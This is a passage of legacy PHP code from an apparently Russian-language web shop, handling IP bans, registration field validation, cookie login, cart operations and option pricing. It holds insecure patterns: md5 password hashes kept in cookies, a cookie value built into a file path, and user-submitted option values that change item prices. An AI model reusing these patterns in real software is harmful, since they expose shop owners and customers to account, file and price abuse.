if (@file_exists("$fileip")==FALSE){$f=fopen($fileip,"w"); flock ($f, LOCK_EX);fputs($f, "1"); flock ($f, LOCK_UN);fclose ($f);} else {$fconip=file($fileip);settype ($fconip[0], "double");$fconip[0]+=1;$f=fopen($fileip,"w"); flock ($f, LOCK_EX);fputs($f, $fconip[0]); flock ($f, LOCK_UN);fclose ($f);}}if (@file_exists("$base_loc/banlist.inc")==TRUE){$blist=file("$base_loc/banlist.inc");while (list ($keybl, $stbl) = each ($blist)) {$stbl=str_replace("ip_","", str_replace("\n","",$stbl));$tmpdiap=explode ("-", $stbl);$ip1="".@$tmpdiap[0];$ip2="".@$tmpdiap[1];if ($ip2=="") {$ip2=$ip1;}$ip['start'] = toint($ip1);$ip['stop'] = toint($ip2);$ip['actual'] = toint(str_replace("ip_", "" , $_SESSION["user_ip"]));if ($ip['actual'] >= $ip['start'] && $ip['actual'] <= $ip['stop']){$_SESSION["user_banned"]=1;}}}}
if (@$_SESSION["user_banned"]=="1"){
include ("./templates/$template/banned.inc");
exit;

}
require("./modules/tit.php");
if (!@$_SESSION["interest"]){ $_SESSION['interest']=""; }
if (!@$_SESSION["last_comm"]){ $_SESSION['last_comm']=""; }
if (!@$_SESSION["user_priceot"]){ $_SESSION['user_priceot']=""; $_SESSION["user_priceot"]=0; }
if (!@$_SESSION["user_pricedo"]){ $_SESSION['user_pricedo']="";$_SESSION["user_pricedo"]=$maximumprice; }
if (!@$_SESSION["user_sorting"]){ $_SESSION['user_sorting']=""; $_SESSION["user_sorting"]="$def_sort";}
if (!@$_SESSION["user_way"]){ $_SESSION['user_way']=""; $_SESSION["user_way"]="$def_way";}

$fuserm=0;
$ffus4="";
$ffus5="";

if (!isset($valid)){$valid="";} if (!preg_match('/^[0-9]+$/i',$valid)) { $valid="";}
if ($valid==""){ $valid="0"; }
$errsyrc="";
if (($action=="vreg")||($action=="send_reg")) {
if (!isset($regcod)){$regcod="";} $regcod=substr($regcod,0,100); if (($regcod!="")&&(!preg_match('/^[a-zA-Z0-9_]+$/i',$regcod))) { $errsyrc.= "<Font color=#b94a48><b>".$lang[168]." $lang[281]!<br>"; $regcod="";}
if (!isset($regcountry)){$regcountry="";}$regcountry=substr(rawurldecode($regcountry),0,300);  if (($regcountry!="")&&(!preg_match('/^[¸¨à-ÿÀ-ßa-zA-Z0-9_\@\,\:\"\'\*\!\#\¹\+\=\$\.\?\&\#\;\ \%\(\)\/-]+$/i',$regcountry))) {  $errsy.= "<Font color=#b94a48>$regcountry <b>".$lang[168]." '".$lang[167]."'!<br>"; $regcountry="";}
if (!isset($verlog)){$verlog="";}$verlog=substr(rawurldecode($verlog),0,300);if (($verlog!="")&&(!preg_match('/^[¸¨à-ÿÀ-ßa-zA-Z0-9_\.\?\&\#\;\ \%\(\)\/-]+$/i',$verlog))) {$errsy.= "<Font color=#b94a48><b>".$lang[168]." '".$lang['login']."'!<br>"; $verlog="";}
if (!isset($regfio)){$regfio="";}$regfio=substr(rawurldecode($regfio),0,300);  if (($regfio!="")&&(!preg_match('/^[¸¨à-ÿÀ-ßa-zA-Z0-9_\@\,\:\"\'\*\!\#\¹\+\=\$\.\?\&\#\;\ \%\(\)\/-]+$/i',$regfio))) { $errsy.= "<Font color=#b94a48><b>".$lang[168]." '".$lang[74]."'!<br>"; $regfio="";}
if (!isset($reggorod)){$reggorod="";}$reggorod=substr($reggorod,0,300); if (($reggorod!="")&&(!preg_match('/^[¸¨à-ÿÀ-ßa-zA-Z0-9_\.\,\?\&\#\;\ \%\(\)\/-]+$/i',$reggorod))) { $errsy.= "<Font color=#b94a48><b>".$lang[168]." '".$lang[72]."'!<br>"; $reggorod="";}
if (!isset($regdomophone)){$regdomophone="";}$regdomophone=substr($regdomophone,0,300);  if (($regdomophone!="")&&(!preg_match('/^[¸¨à-ÿÀ-ßa-zA-Z0-9_\.\,\?\&\#\;\ \%\(\)\/-]+$/i',$regdomophone))) { $errsy.= "<Font color=#b94a48><b>".$lang[168]." '".$lang[69]."'!<br>"; $regdomophone="";}
if (!isset($regofice)){$regofice="";}$regofice=substr($regofice,0,300);  if (($regofice!="")&&(!preg_match('/^[¸¨à-ÿÀ-ßa-zA-Z0-9_\@\.\,\?\&\#\;\ \%\(\)\/-]+$/i',$regofice))) { $errsy.= "<Font color=#b94a48><b>".$lang[168]." '".$lang[65]."'!<br>"; $regofice="";}
if (!isset($verpass)){$verpass="";}$verpass=substr(rawurldecode($verpass),0,100);  if (($verpass!="")&&(!preg_match('/^[¸¨à-ÿÀ-ßa-zA-Z0-9_\.\,\?\&\#\;\ \%\(\)\/-]+$/i',$verpass))) { $errsy.= "<Font color=#b94a48><b>".$lang[168]." '".$lang['pass']."'!<br>"; $verpass="";}
if (!isset($regemail)){$regemail="";}$regemail=substr(rawurldecode($regemail),0,300);  if (($regemail!="")&&(!preg_match('/^[¸¨à-ÿÀ-ßa-zA-Z0-9_\.\@\?\&\ \%\(\)\/-]+$/i',$regemail))) { $errsy.= "<Font color=#b94a48><b>".$lang[168]." 'E-mail'!<br>"; $regemail="";}
if (!isset($regtel)){$regtel="";}$regtel=substr($regtel,0,300);  if (($regtel!="")&&(!preg_match('/^[¸¨à-ÿÀ-ßa-zA-Z0-9_\.\,\?\&\ \+\%\(\)\/-]+$/i',$regtel))) { $errsy.= "<Font color=#b94a48><b>".$lang[168]." '".$lang[73]."'!<br>"; $regtel="";}
if (!isset($regtelcode)){$regtelcode="";}$regtelcode=substr($regtelcode,0,300); if (($regtelcode!="")&&(!preg_match('/^[¸¨à-ÿÀ-ßa-zA-Z0-9_\.\,\?\&\ \+\%\(\)\/-]+$/i',$regtelcode))) { $errsy.= "<Font color=#b94a48><b>".$lang[168]." '".$lang[157]."'!<br>"; $regtelcode="";}
if (!isset($regmetro)){$regmetro="";}$regmetro=substr($regmetro,0,300);  if (($regmetro!="")&&(!preg_match('/^[¸¨à-ÿÀ-ßa-zA-Z0-9_\@\,\:\"\'\*\!\#\¹\+\=\$\.\?\&\#\;\ \%\(\)\/-]+$/i',$regmetro))) { $errsy.= "<Font color=#b94a48><b>".$lang[168]." '".$lang[61]."'!<br>"; $regmetro="";}
if (!isset($regstreet)){$regstreet="";}$regstreet=substr($regstreet,0,300);  if (($regstreet!="")&&(!preg_match('/^[¸¨à-ÿÀ-ßa-zA-Z0-9_^\@\,\:\"\'\*\!\#\¹\+\=\$\.\?\&\#\;\ \%\(\)\/-]+$/i',$regstreet))) {$errsy.= "<Font color=#b94a48><b>".$lang[168]." '".$lang[71]."'!<br>"; $regstreet="";}
if (!isset($reghouse)){$reghouse="";}$reghouse=substr($reghouse,0,10);  if (($reghouse!="")&&(!preg_match('/^[¸¨à-ÿÀ-ßa-zA-Z0-9_\.\,\?\&\#\;\ \%\"\(\)\/-]+$/i',$reghouse))) { $errsy.= "<Font color=#b94a48><b>".$lang[168]." '".$lang[68]."'!<br>";$reghouse="";}
if (!isset($regkorp)){$regkorp="";}$regkorp=substr($regkorp,0,10);  if (($regkorp!="")&&(!preg_match('/^[¸¨à-ÿÀ-ßa-zA-Z0-9_\.\,\?\&\#\;\ \%\(\)\"\/-]+$/i',$regkorp))) { $errsy.= "<Font color=#b94a48><b>".$lang[168]." '".$lang[67]."'!<br>"; $regkorp="";}
if (!isset($regpod)){$regpod="";}$regpod=substr($regpod,0,10);  if (($regpod!="")&&(!preg_match('/^[¸¨à-ÿÀ-ßa-zA-Z0-9_\.\,\?\&\#\;\ \%\(\)\"\/-]+$/i',$regpod))) { $errsy.= "<Font color=#b94a48><b>".$lang[168]." '".$lang[66]."'!<br>"; $regpod="";}
if (!isset($regdomophone)){$regdomophone="";}$regdomophone=substr($regdomophone,0,30);  if (($regdomophone!="")&&(!preg_match('/^[¸¨à-ÿÀ-ßa-zA-Z0-9_\.\"\,\?\&\#\;\ \%\(\)\/-]+$/i',$regdomophone))) { $errsy.= "<Font color=#b94a48><b>".$lang[168]." '".$lang[69]."'!<br>"; $regdomophone="";}
if (!isset($regflat)){$regflat="";}$regflat=substr($regflat,0,10);  if (($regflat!="")&&(!preg_match('/^[¸¨à-ÿÀ-ßa-zA-Z0-9_\.\,\?\&\#\;\ \%\(\)\"\/-]+$/i',$regflat))) { $errsy.= "<Font color=#b94a48><b>".$lang[168]." '".$lang[65]."'!<br>"; $regflat="";}
if (!isset($regother)){$regother="";}$regother=substr($regother,0,1000);  if (($regother!="")&&(!preg_match('/^[¸¨à-ÿÀ-ßa-zA-Z0-9_\@\,\:\"\'\*\!\#\¹\+\=\$\.\?\&\#\;\ \%\(\)\/-]+$/i',$regother))) { $errsy.= "<Font color=#b94a48><b>".$lang[168]." '".$lang[28]."'!<br>"; $regother="";}

if (@file_exists("./templates/$template/$speek/custom_user.inc")==TRUE) {
$user_arr=file ("./templates/$template/$speek/custom_user.inc");
reset ($user_arr);

while (list ($user_num, $user_line) = each ($user_arr)) {
$user_line=trim(str_replace("\n", "", $user_line));

if ($user_line!="") {
$user_mass=explode("|", $user_line);
if (!isset($regfm[$fuserm])) { $regfm[$fuserm]=""; if ($user_mass[4]==1){$errsy.= "<font color=#b94a48><b>".$lang[70]." ".$user_mass[0]."!</b></font><br>";}}
if (!preg_match('/^[¸¨à-ÿÀ-ßa-zA-Z0-9_\@\,\:\"\'\*\!\#\¹\+\=\$\.\?\&\#\;\ \%\(\)\/-]+$/i',$regfm[$fuserm])) {
$regfm[$fuserm]="";
} else {
if ($user_mass[4]==1){
if ($regfm[$fuserm]=="") {
$errsy.= "<font color=#b94a48>E900 <b>".$lang[70]." ".$lang[81].": '".$user_mass[0]."'!</b></font><br>";
$ee[$fuserm]="&nbsp;<span class=\"label label-important\"><i class=\"icon-hand-left icon-white\"></i></span>";
$regfm[$fuserm]="";
}
}

if ($user_mass[5]!="") {
$strin="^[".$user_mass[5]."]+$";
if (($regfm[$fuserm]!="")&&(!preg_match("/$strin/i",$regfm[$fuserm]))) {
$errsy.= "<Font color=#b94a48><b>".$lang[168]." '".$user_mass[0]."'! ".$lang[220]." ".$user_mass[5]."</b></font><br>";
$regfm[$fuserm]="";
}
}

$ffus4.=$regfm[$fuserm]."|";
$ffus5.="<br><b>".$user_mass[0].":</b> ".$regfm[$fuserm];
$fuserm+=1;
}
}
}
}
$ffus5.="<br><br>";
}



require ("./templates/$template/css.inc");
$oldnc10=$nc10;
$oldnc8=$nc8;
if($_SESSION["user_ltype"]==$ltypes[1]) { $styl1=" style=\"border: 2px solid $nc2;\""; }
if($_SESSION["user_ltype"]==$ltypes[2]) { $styl2=" style=\"border: 2px solid $nc2;\""; }
if($_SESSION["user_ltype"]==$ltypes[3]) { $styl3=" style=\"border: 2px solid $nc2;\""; }
if ($view_freedeliveryicon==0) {$dost_naim1=""; $dost_naim2=""; $zakaz_do_stavka=0;} else {$zakaz_do_stavka=$currencies_zakaz_dostav[$valut];}
if ((strlen($query)<$minquery)&&($query!="")) {$query=""; $error="<noindex><br><font color=$nc2 size=3><br><b>".$lang[93]."</b></font><br><br></noindex>";  $tit=""; }
if (!isset($path_to_buy)) {$path_to_buy="add";} if (!preg_match('/^[a-z]+$/i',$path_to_buy)) { $path_to_buy="add";}
if ($usetheme==1) {
$exxx = ExtractString($themecontent, "[varcart]", "[/varcart]");
if ($exxx!=0) {$varcart=$exxx;} unset($exxx);
$exxx = ExtractString($themecontent, "[carth]", "[/carth]");

if ($exxx!=0) {$carth=$exxx;} unset($exxx);
$exxx = ExtractString($themecontent, "[cols_of_goods]", "[/cols_of_goods]");
if ($exxx!=0) {$cols_of_goods=$exxx;} unset($exxx);
$exxx = ExtractString($themecontent, "[goods_perpage]", "[/goods_perpage]");
if ($exxx!=0) {$goods_perpage=$exxx;} unset($exxx);
$exxx = ExtractString($themecontent, "[use_vert_js_incart]", "[/use_vert_js_incart]");
if ($exxx!=0) {$use_vert_js_incart=$exxx;} unset($exxx);
}

require ("./modules/tcounter.php");



if ($action!="$path_to_buy") {

if ($unifid!="") {$query="";}
if ($fid!="") {$query="";}
}
//

$query = htmlspecialchars(strip_tags ($query));
$query = trim($query);
$query= stripslashes($query);
if ($query!=""){ $tit=$query." - "; }
require ("./modules/functions.php");
require ("./modules/options.php");


if(isset($_GET['naim'])) {$naim=$_GET['naim']; } elseif(isset($_POST['naim'])) { $naim=$_POST['naim']; } else { $naim="";}
if ((!@$naim) || (@$naim=="")){ $naim=""; }
if(isset($_GET['option_title'])) {$option_title=$_GET['option_title']; } elseif(isset($_POST['option_title'])) { $option_title=$_POST['option_title']; } else { $option_title="";}
if ((!@$option_title) || (@$option_title=="")){ $option_title=""; }
if($stuk!=1){
if(isset($_GET['page'])) { $page=$_GET['page']; } elseif(isset($_POST['page'])) { $page=$_POST['page']; } else { $page="";}
if (!preg_match('/^[a-z0-9_-]+$/i',$page)) { $page="";}
}
if ($page!="") {$action="viewfile";}
$opage=$page;
$rpage=substr($page,0,1);

if (($action=="viewfile") && ($opage!="")) {

$rvpt="";
if ($friendly_url==1) {  if (@file_exists("$base_loc/wiki/$opage.man")==TRUE) {
$ptmp = fopen ("$base_loc/wiki/$opage.man" , "r");
$page = trim(@fread($ptmp, @filesize("$base_loc/wiki/$opage.man")));
fclose($ptmp);
}}
$realpage=substr($page,0,1);
if (@file_exists("$base_loc/content/$page.txt")==false) {
header($_SERVER["SERVER_PROTOCOL"]." 404 Not Found");
$viewpage_title=$lang[1102];
$mod="admin";
$tit=$lang[1102];
} else {
if ($friendly_url==1) {

$ptmp = fopen ("$base_loc/content/$realpage.txt" , "r");
$rpagecont = trim(@fread($ptmp, @filesize("$base_loc/content/$realpage.txt")));
$rpagetit1=array();
$rpagetit1[1]="";
$rpagetit1=explode("==",$rpagecont);
if ($rpagetit1[1]!="") {

$rpage_title=trim(strtoken(strtoken(strip_tags(trim($rpagetit1[1])),"["),"|"));
$rvpt=$rpagetit1[1];
$rpagetit[1]=$rpagetit1[1];
unset ($rpagetit1);
} else {
$viewpage_title = $lang[221];
$rvpt="";
}
fclose($ptmp);
}
$rpage=translit($rvpt);


}
}
if(isset($_GET['options'])) { $options=$_GET['options']; } elseif(isset($_POST['options'])) { $options=$_POST['options']; } else { $options="";}
if ((!@$options) || (@$options=="")){ $options=""; }
if(isset($_GET['kupil'])) { $kupil=$_GET['kupil']; } elseif(isset($_POST['kupil'])) { $kupil=$_POST['kupil']; } else { $kupil=""; }
if (!preg_match('/^[a-z0-9_]+$/i',$kupil)) { $kupil="";}
if ((!@$kupil) || (@$kupil=="")) { $kupil=""; }
if(isset($_GET['old_action'])) { $old_action=$_GET['old_action']; } elseif(isset($_POST['old_action'])) { $old_action=$_POST['old_action']; } else { $old_action=""; }
if (!preg_match('/^[a-z0-9_]+$/i',$old_action)) { $old_action="";}
if ((!@$old_action) || (@$old_action=="")){ $old_action=""; }
if(isset($_GET['view'])) { $view=$_GET['view'];} elseif(isset($_POST['view'])){ $view=$_POST['view']; } else { $view="";}
if (!preg_match('/^[a-z0-9_]+$/i',$view)) { $view="";}
if ((!@$view) || (@$view=="")){ $view=""; }
if(isset($_GET['qty'])) { $qty=$_GET['qty']; } elseif(isset($_POST['qty'])) { $qty=$_POST['qty']; } else { $qty=0; }
if (!preg_match('/^[0-9\.,_]+$/i',$qty)) { $qty=0;}
if(isset($_GET['cod'])) { $cod=$_GET['cod']; } elseif(isset($_POST['cod'])) { $cod=$_POST['cod']; } else { $cod="";}
if (!preg_match('/^[a-z0-9]+$/i',$cod)) { $cod="";}
if ((!@$price) || (@$price=="") || (@$price=="0")){ $price=0; }



$qty=doubleval(str_replace(",",".", $qty));
if ((!@$_COOKIE["user_name"]) || (@$_COOKIE["user_name"]=="")){ $_COOKIE["user_name"]=""; }
if (!preg_match('/^[a-zA-Z0-9_\&\#\;\.\/-]+$/i',@$_COOKIE["user_name"])) { @$_COOKIE["user_name"]="";}
if ((!@$_COOKIE["user_pass"]) || (@$_COOKIE["user_pass"]=="")){ $_COOKIE["user_pass"]=""; }
if (!preg_match('/^[a-zA-Z0-9_\&\#\;\.\/-]+$/i',@$_COOKIE["user_pass"])) { @$_COOKIE["user_pass"]="";}

if (($_COOKIE["user_name"]!=="")&&($_COOKIE["user_pass"]!=="")&&($valid=="0")) {


$login=$_COOKIE["user_name"];
$password="";
if (@file_exists("./admin/userstat/".$login.".txt")) {
$file="./admin/userstat/".$login.".txt";
} else {
$file="./admin/db/users.txt";
}
$f=fopen($file,"r");

while(!feof($f)) {
$st=fgets($f);

$out=explode("|",$st);

@$login2=@$out[1];
@$password2=@$out[2];

if (($login=="$login2")&&(md5(substr($artrnd.$password2.$secret_salt, 0, 128))==$_COOKIE["user_pass"])) {
$password=$password2;
break;
}
}
fclose($f);

}



if (( @$_SESSION["user_login"]!="")&&( @$_SESSION["user_password"]!="")){ $login=$_SESSION["user_login"]; $password=$_SESSION["user_password"]; }
if (($valid=="0")&&($login!="")&&($password!="")){
$valid=$cart->authorize("$login","$password"); SetCookie("user_name", substr($login, 0, 40), time()+1003600,$cookiedir,$_SERVER['SERVER_NAME']); SetCookie("user_pass", md5(substr($artrnd.$password.$secret_salt, 0, 128)), time()+1003600,$cookiedir,$_SERVER['SERVER_NAME']);

}




if ((!@$priceot) || (@$priceot=="")){ $priceot=$_SESSION["user_priceot"]; }
if (!preg_match('/^[0-9\.-]+$/i',$priceot)) { $priceot=$_SESSION["user_priceot"];}
if ($priceot=="-"){ $priceot=0; }
if ((!@$pricedo) || (@$pricedo=="")){ $pricedo=$_SESSION["user_pricedo"]; }
if (!preg_match('/^[0-9\.]+$/i',$pricedo)) { $pricedo=$_SESSION["user_pricedo"];}
if ((!@$sorting) || (@$sorting=="")){ $sorting=$_SESSION["user_sorting"];}
if (!preg_match('/^[0-9a-z]+$/i',$sorting)) { $sorting=$_SESSION["user_sorting"];}
if ((!@$way) || (@$way=="")){ $way=$_SESSION["user_way"]; }
if (!preg_match('/^[0-9a-z]+$/i',$way)) { $way=$_SESSION["user_way"];}
if ($priceot!=$_SESSION["user_priceot"]){$_SESSION["user_priceot"]=$priceot;}
if ($pricedo!=$_SESSION["user_pricedo"]){$_SESSION["user_pricedo"]=$pricedo;}
if ($way!=$_SESSION["user_way"]){$_SESSION["user_way"]=$way;}
if ($sorting!=$_SESSION["user_sorting"]){$_SESSION["user_sorting"]=$sorting;}
if ($way=="up"){$op4=" style=\"border-bottom: 1px dotted; font-weight:400\""; $op5=""; }else{$op5=" style=\"border-bottom: 1px dotted; font-weight:400\""; $op4="";}
$optionsort="<option selected value=\"price\">".$lang['by_price']."</option>";
if ($sorting=="price"){$op1=" style=\"border-bottom: 1px dotted; font-weight:400\"";$op6="";$op2="";$op3="";}
if ($sorting=="name"){$op1="";$op6="";$op2=" style=\"border-bottom: 1px dotted; font-weight:400\"";$op3="";}
if ($sorting=="date"){$op1="";$op2="";$op6="";$op3=" style=\"border-bottom: 1px dotted; font-weight:400\"";}
if ($sorting=="rate"){ $op1="";$op2=""; $op3=""; $op6=" style=\"border-bottom: 1px dotted; font-weight:400\"";}


if (($query=="")&&($unifid=="")&&($item_id=="")&&($catid=="0")&&($action=="x")&&($register!=1)&&($zak=="")&&($cat=="")&&($sign_in!=1)){ } else {
$fpfound=0;
$fpcount=0;
while ($fpcount<20) {
$firstpage[$fpcount] = ExtractString($themecontent, "[firstpage]", "[/firstpage]");
if ($firstpage[$fpcount]=="") {break; } else {
$themecontent=str_replace("[firstpage]".$firstpage[$fpcount]."[/firstpage]", "[firstpage$fpcount]", $themecontent); }
$fpcount+=1;
}
}

require ("./modules/catbuttons.php");
require ("./modules/online.php");

if ($mod!="admin") {
require ("./templates/$template/$speek/extra_search.inc");
$extsearch_text="";
if (($allow_ext_search==1)&&($page=="")&&($action!="basket")&&($action!="zakaz")&&($action!="send")){  require ("./modules/ext_search.php"); }

require ("./modules/".$scriptprefix."sort.php");
if (($error=="")&&($allow_search==1)) {if ($items_db_type=="mysql") { require ("./modules/mysql_search.php"); } else {require ("./modules/search.php"); } }

}
if ($usetheme==0) {
if ($view_goodsprice==1){ if ($view_sort==0) { $sortecho=""; }} else {$sortecho="";}
} else {

if ($view_goodsprice==1){ if ($view_sort!=0) { $themecontent=str_replace("[sortmenu]","$sortecho",$themecontent); $sortecho="";}else {$sortecho="";}} else {$sortecho="";}
}
$olda="";

require "./modules/rss.php";
require "./modules/page.php";

if ($olda=="x") {$action="x";}

$admin_url="";

if (($action=="$path_to_buy")&&($qty!=0)&&($unifid!="")&&($_SESSION["user_module"]!="site")){
$add_it=Array();
if ($items_db_type=="mysql") {
require "./modules/mysql_unicart.php";
$add_it[0]=$unifid;
$out_cart=$st;
$out_c=$tmpmsf;
}else{
require "./modules/unicart.php";
$add_it[0]=$fid;
$out_cart=get_info($add_it);
$out_c=explode("|",$out_cart[$fid]);
}





if (($podstavas["$r|$sub|"]!="")||(preg_match("/\%/", @$out_c[8])==TRUE)) {

$strtoma=Array();
$strtoma=explode("%",@$out_c[8]);
$strto=@$strtoma[0];
unset($strtoma);
if ((preg_match("/\%/", @$out_c[8])==TRUE)&&(doubleval($strto)>0)) {$out_c[4]=$out_c[4]-($out_c[4]*(doubleval($strto))/100);} else {$strto=doubleval($podstavas["$r|$sub|"]);  $out_c[4]=$out_c[4]-($out_c[4]*((double)$podstavas["$r|$sub|"])/100);}
} else {
if (($valid=="1")&&($details[7]=="VIP")){ $out_c[4]=$out_c[4]-$out_c[4]*$vipprocent; }
}
$optius2="";
if (!isset($option)) {$option=Array();}
if (!isset($ao)) {$ao=Array();}

if (is_array($option)) {
while (list ($o_num, $o_line) = each ($option)) {
$optius2.="&option".rawurlencode("[").$o_num.rawurlencode("]")."=$o_line";
if (!isset($option[$o_num])){$option[$o_num]="";}
if (!preg_match('/^[0-9]+$/i',$option[$o_num])) { $option[$o_num]="";}
$option[$o_num]=doubleval(substr($option[$o_num],0,2));
if ($option[$o_num]>0) {
if ((isset($optiontitle[$o_num]))&&(isset($optionreg[$o_num."_".$o_line]))) {
if ($option[$o_num]!=""){
$options.="<b>".$optiontitle[$o_num]."</b> ".$optionreg[$o_num."_".$o_line]."<br>";
if ((isset($optionprice[$o_num."_".$o_line]))&&(@$optionprice[$o_num."_".$o_line])!="") {
if (preg_match("/\%/",$optionprice[$o_num."_".$o_line])) { $optionprice[$o_num."_".$o_line]=$okr*(round((($out_c[4]*doubleval($optionprice[$o_num."_".$o_line]))/100)/$okr)); }
$out_c[4]+=$optionprice[$o_num."_".$o_line];
}
}
}
}
}
}

if (is_array($ao)) {
while (list ($ao_num, $ao_line) = each ($ao)) {
$ao_line=str_replace("<","", str_replace(">", "", str_replace("|","", str_replace("\\","", trim(stripslashes(strip_tags($ao[$ao_num])))))));
$optius2.="&ao".rawurlencode("[".$ao_num."]")."=".rawurlencode($ao_line);
$ao_line=substr($ao_line,0,500);
if ($ao_line!="") {
$tmpao=Array();
$tmpao=explode("^", $ao_line);
if ($tmpao[1]!="") {
if (substr($tmpao[1],0,1)=="-") {$znakop="";} else {$znakop="+";}
if ($tmpao[1]>0) {

if ($aosign=="") { $aosign="$init_currency";}
$options.=$tmpao[0]." $znakop".$tmpao[1]." $aosign<br>";
} else {
$options.=$tmpao[0]."<br>";

}
if (($tmpao[0]!="")&&($tmpao[1])!="") {
$out_c[4]+=$tmpao[1];
}
} else {
$options.=$tmpao[0]."<br>";
}
}

}
}


$fi="";
$fi= @str_replace("' border=0>","", str_replace("<img src='", "", str_replace("$htpath", "",  stripslashes(@$out_c[9]))));
if (@file_exists(".$fi")){
$maxw=$style['spec_w'];
$imagesz = @getimagesize(".$fi");
$widt=round($maxw*($imagesz[1]/($imagesz[0]+1)));
if ($widt==0){$widt=$maxw;}
$wh="width=".$maxw." height=".$widt;

} else{
$wh="width=".$style['spec_w']." height=".$style['spec_h'];
}
unset($fi);
@$out_c[9]=str_replace("<img ", "<img align=\"left\" $wh ", @$out_c[9]);
$out_c[9]=str_replace("width= height= ", "", $out_c[9]);
@$out_c[9]=str_replace("border=0", "border=1 hspace=3 style=\"border: 1 solid ".$style['nav_col1']."\"", @$out_c[9]);

if ($zero_price_incart==0){ if (@$out_c[4]==0) { $catid=""; $error.=$lang['file'].": ".$lang[222]." E0<br>";}}
if (substr(@$out_c[12],0,1)=="0") { $catid=""; $error.=$lang['file'].": ".$lang[222]." E1<br>";}
if ($error=="") {
$_SESSION["user_basket"]="ok";
if (!isset($out_c[$netweight])) {$out_c[$netweight]=$def_weight;}
if (!isset($out_c[$box_volume])) {$out_c[$box_volume]=0;}
if ($out_c[$netweight]=="") {$out_c[$netweight]=$def_weight;}
if ($out_c[$netweight]=="0") {$out_c[$netweight]=$def_weight;}
if ($out_c[$netweight]==0) {$out_c[$netweight]=$def_weight;}
if ($out_c[$box_volume]=="") {$out_c[$box_volume]=0;}
if ($out_c[$box_volume]=="0") {$out_c[$box_volume]=0;}
if ($out_c[$box_volume]==0) {$out_c[$box_volume]=0;}

$didx=$details[7]; $ddidx=@$whsalerprice[$didx]; $price=@$out_c[$ddidx];
if ($onlyopt==1) {
if ($valid=="1") { if ((substr($details[7],0,3)=="OPT")||($details[7]=="ADMIN")||($details[7]=="MODER")) { } else { $lang['prebuy']=$lang[736]; $price=0; } } else { $lang['prebuy']=$lang[736]; $price=0;}
}

if ($items_db_type=="mysql") {
$cart->add_item($unifid."|".$options,$qty,$price,@$tmpmsf[3]." ID:".@$tmpmsf[6], $sc, $options,$optius2, @$tmpmsf[9], @$tmpmsf[5], substr(@$tmpmsf[12],1,3) , $tmpmsf[$netweight], trim($st),$speek, $tmpmsf[$box_volume]);
}else{
$cart->add_item($unifid."|".$options,$qty,$price,@$out_c[3]." ID:".@$out_c[6], $fid, $options, $optius2, $out_c[9], $okr*(round(($optkurs*$out_c[5])/$okr)), substr(@$out_c[12],1,3) , $out_c[$netweight], trim($out_cart[$fid]), $speek, $out_c[$box_volume]);
}



}
unset($out_c,$out_cart,$add_it);
}




if (($action=="add_older")&&($_SESSION["user_module"]!="site")&&($login!="")&&($password!="")&&(@$details[1]!="")&&(@$_SESSION["user_basket"]!="ok")&&(@file_exists("./admin/userstat/".@$details[1])==TRUE)&&(substr(@$details[1],0,3)!="vip")) {


$nazvolder="./admin/userstat/".@$details[1]."/user.basket";
$basket_older=file($nazvolder);
$content_older="";
$poditog_total=0;
$kol_total=0;
reset ($basket_older);
while (list ($key_old, $st_old) = each ($basket_older)) {
$tmp_old=explode("|", $st_old);
if ($tmp_old[0]!="") {
$oldunifids[$key_old]=md5($tmp_old[4]);
$oldprice[$key_old]=$tmp_old[1];
$oldopt[$key_old]=$tmp_old[7];
$oldqtys[$key_old]=$tmp_old[0];
$oldoption[$key_old]=$tmp_old[2];
$oldoption2[$key_old]=$tmp_old[3];

}
unset ($tmp_old);
}
$mnogo=1;
if ($items_db_type=="mysql") {
require "./modules/mysql_unicart.php";
}else{
require "./modules/unicart.php";
}
}
if ($_SESSION["user_module"]!="site") {
if ($mnogo==2) {
require "./modules/wholesale.php";
}
}


if (($action=="del")&&($cod!="")){ $cart->del_item($cod); $action="basket"; }
if (($action=="specdel")&&($cod!="")){ $cart->del_item($cod); $action="addtospec"; }
if ($action=="edit"){
	if (!isset ($new_qty)) {
		} else {
			if (is_array($new_qty)) {
while (list ($key, $val) = each ($new_qty)) {
$cart->edit_item($key, doubleval(str_replace(",",".", $val)));
}
}}
$action="basket";
}
unset($key, $val, $new_qty);


$ccat="";
if (!isset($_SESSION["jscur"])){ $_SESSION["jscur"]=0;  }

if ($old_action!=""){ $action=$old_action; $cart_id=$cod; $kupil=" "; if ($view_basketalert==1) { $kupil.="<a id=minibasket_"."$unifid href=$htpath/".$scriptprefix."minibasket.php?unifid=$unifid&qty=$qty&speek=$speek></a><script type=\"text/javascript\">
        $(document).ready(function() {
           $(\"#minibasket_"."$unifid\").fancybox({
                   'onComplete'	:	function() {\$(\"#fancybox-wrap\").unbind('mousewheel.fb');} ,
        'hideOnOverlayClick' : true,
        'hideOnContentClick' : true,
        'transitionIn'	:	'none',
        'transitionOut'	:	'none',
        'scrolling'		:	'no',
        'padding'		:	50,
	    'titleShow'		:	false,
        'overlayShow'	:	false
           }).trigger('click');

        });
    </script>"; } }


if ($_SESSION["user_module"]!="site") {
if (($fid!="")&&($catid!="")&&($catid!="_")) {} else {
if (($action=="x")||($action=="viewcart")) {
if (($unifid!="")||($item_id!="")) {
if ($items_db_type=="mysql") {
require ("./modules/mysql_unicart.php");
require "./modules/mysql_cart.php";
}else {
require ("./modules/unicart.php");
}
}
//echo $catid;
if ($items_db_type!="mysql") {
if ($fid!="") {
if ($foundunif!=0) {
require "./modules/cart.php";
$cartloaded=1;
} else {
if ($flag=="") {
$viewpage_title = $lang[1102];
header($_SERVER["SERVER_PROTOCOL"]." 404 Not Found");
$error.="<br><img src=$image_path/error404.png border=0 align=left hspace=10 title=\"OOPS!\"><b>".$lang[1103]."</b><br><br>".$lang[1104]. " <b><a href=$htpath/index.php>". $shop_name."</a></b><META HTTP-EQUIV=\"REFRESH\" CONTENT=\"5;URL=$htpath/index.php\"><br><br><br><br>".$lang['file']." ".$lang[222] ." E3<br><br><br><br><br>";  }
$mod="admin";
$tit=$lang[1102];
$fid=""; $catid=0;
}
}
}
}
}

$curjs=$_SESSION["jscur"];
if ($ccat!="") {$catidcur=$ccat;} else { $catidcur=$catid;}

if (($catidcur!="")&&($catidcur!="0")) { $indcur=$catidcur;  if (!isset($_SESSION["$indcur"])){ $_SESSION["$indcur"]=0;  }
$curjs=$_SESSION["$indcur"];
}
}


if (file_exists("./templates/$template/if_module_before_meta.inc")) {
require ("./templates/$template/if_module_before_meta.inc");
require ("./modules/catid_desc.php");
}

if (file_exists("./templates/$template/$speek/meta.inc")) {
include ("./templates/$template/$speek/meta.inc");
} else {
